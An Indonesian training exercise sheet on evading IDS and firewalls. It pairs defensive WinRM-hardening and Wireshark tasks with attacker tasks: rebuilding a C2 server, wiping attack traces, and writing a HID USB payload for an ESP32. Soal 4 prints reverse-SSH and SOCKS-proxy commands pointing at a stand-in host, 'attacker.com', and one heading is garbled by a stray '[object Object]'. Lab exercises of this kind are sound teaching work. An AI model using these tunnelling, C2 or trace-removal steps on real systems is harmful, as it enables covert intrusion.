# Evading IDS dan Firewall

## Lat3

### Soal 1

Buat presentasi analisis sebagai defender untuk menutup celah yang telah dilakukan winrm sebelumnya. Gunakan teknik yang telah dipelajari pada modul sebelumnya.

### Analisis

1. **Mengidentifikasi Celah Keamanan:**
   - **WinRM (Windows Remote Management):** WinRM adalah protokol yang digunakan untuk mengelola sistem Windows secara remote. Namun, jika tidak dikonfigurasi dengan benar, WinRM dapat menjadi vektor serangan yang berbahaya.
   - **Port Terbuka:** Port 5985 (HTTP) dan 5986 (HTTPS) biasanya digunakan oleh WinRM. Jika port ini terbuka tanpa autentikasi yang kuat, sistem rentan terhadap serangan seperti brute force atau eksploitasi kerentanan.

2. **Analisis Log:**
   - **Log Firewall:** Periksa log firewall untuk melihat koneksi masuk ke port 5985 atau 5986. Identifikasi IP sumber dan waktu koneksi.
   - **Log IDS/IPS:** Periksa log IDS/IPS untuk mendeteksi aktivitas mencurigakan yang terkait dengan WinRM, seperti upaya brute force atau eksploitasi kerentanan.

3. **Konfigurasi WinRM:**
   - **Autentikasi:** Pastikan WinRM hanya menerima koneksi dari IP yang diperbolehkan. Gunakan autentikasi yang kuat seperti Kerberos atau sertifikat digital.
   - **Enkripsi:** Gunakan HTTPS (port 5986) untuk mengenkripsi komunikasi WinRM.
   - **Akses Terbatas:** Batasi akses ke WinRM hanya untuk pengguna yang berwenang.
   - **Nonaktifkan Jika Tidak Digunakan:** Jika WinRM tidak diperlukan, nonaktifkan layanan ini untuk mengurangi risiko.
   - **Pembaruan dan Patch:** Pastikan sistem Windows selalu diperbarui dengan patch terbaru untuk mengatasi kerentanan yang diketahui.
   - **Pemantauan:** Gunakan alat pemantauan untuk memantau aktivitas WinRM secara real-time dan mengidentifikasi aktivitas mencurigakan.

### Presentasi

#### Struktur Presentasi

1. **Pendahuluan**
   - Penjelasan tentang WinRM dan peranannya dalam manajemen sistem Windows.
   - Penjelasan tentang risiko keamanan jika WinRM tidak dikonfigurasi dengan benar.

2. **Analisis Celah Keamanan**[object Object],[object Object]ifikasi celah keamanan yang ditemukan, termasuk port terbuka dan konfigurasi WinRM yang tidak aman.
   - Penjelasan tentang bagaimana celah ini dapat dieksploitasi oleh penyerang.
   - Contoh serangan yang mungkin terjadi, seperti brute force atau eksploitasi kerentanan.
   - Contoh log yang menunjukkan aktivitas mencurigakan terkait WinRM.

3. **Langkah-Langkah Penutupan Celah**
   - Langkah-langkah untuk mengamankan WinRM, termasuk:
     - Mengaktifkan autentikasi yang kuat.
     - Menggunakan HTTPS untuk enkripsi.
     - Membatasi akses ke WinRM hanya untuk pengguna yang berwenang.
     - Menonaktifkan WinRM jika tidak diperlukan.
     - Memperbarui sistem dengan patch terbaru.
     - Menggunakan alat pemantauan untuk memantau aktivitas WinRM.

4. **Kesimpulan**
   - Ringkasan langkah-langkah yang telah diambil untuk menutup celah keamanan.
   - Penjelasan tentang pentingnya pemantauan dan pembaruan rutin untuk menjaga keamanan sistem.

### Soal 2

Untuk attacker, bangun kembali command and control (C2) server. dengan menggunakan tools yang ada di project c2li folder ssh dan cs.

1. Jelaskan langkah-langkah untuk membangun kembali C2 server menggunakan tools yang ada di project c2li folder ssh dan cs.
2. Jelaskan bagaimana cara mengakses C2 server yang telah dibangun.
3. Jelaskan bagaimana cara menggunakan C2 server untuk melakukan serangan terhadap target.
4. Jelaskan bagaimana cara menghapus jejak serangan yang telah dilakukan menggunakan C2 server.
5. Jelaskan bagaimana cara mengamankan C2 server dari serangan balasan (counter-attack) dari target.

### Soal 3

1. Jelaskan bagaimana cara mengidentifikasi serangan yang dilakukan menggunakan C2 server.
2. Jelaskan bagaimana cara menganalisis serangan yang dilakukan menggunakan C2 server.
3. Jelaskan bagaimana cara membalas serangan yang dilakukan menggunakan C2 server.
4. Jelaskan bagaimana cara mencegah serangan yang dilakukan menggunakan C2 server.
5. Jelaskan bagaimana cara mengamankan C2 server dari serangan balasan (counter-attack) dari target.

### Soal 4

Install dulu git bash agar bisa ssh. Contoh perintah reverse ssh dan socks proxy.

```sh
ssh -R 2222:localhost:22 user@attacker.com
ssh -D 1080 user@attacker.com
```

untuk attacker, coba gunakan reverse ssh dan socks proxy untuk mengakses target.

1. Jelaskan bagaimana cara menggunakan reverse ssh untuk mengakses target.
2. Jelaskan bagaimana cara menggunakan socks proxy untuk mengakses target.
3. Jelaskan bagaimana cara menghapus jejak serangan yang dilakukan menggunakan reverse ssh dan socks proxy.
4. Jelaskan bagaimana cara mengamankan reverse ssh dan socks proxy dari serangan balasan (counter-attack) dari target.
5. Jelaskan bagaimana cara mengamankan reverse ssh dan socks proxy dari serangan balasan (counter-attack) dari target.

### Soal 5

Untuk attacker gunakan aplikasi hid aniani untuk hack usb dan menjalankan perintah yang perlu dijalankan agar bisa meloloskan C2. Jelaskan langkah-langkah untuk menggunakan aplikasi aniani untuk hack usb dan menjalankan perintah yang perlu dijalankan. Buat kode program .ino yang siap di flash ke lolin s2 mini atau esp32-s3.

### Soal 6

Untuk defender buka dan pantau wireshark untuk melihat apakah ada serangan yang masuk. Jelaskan langkah-langkah untuk menggunakan wire shark untuk memantau serangan yang masuk.
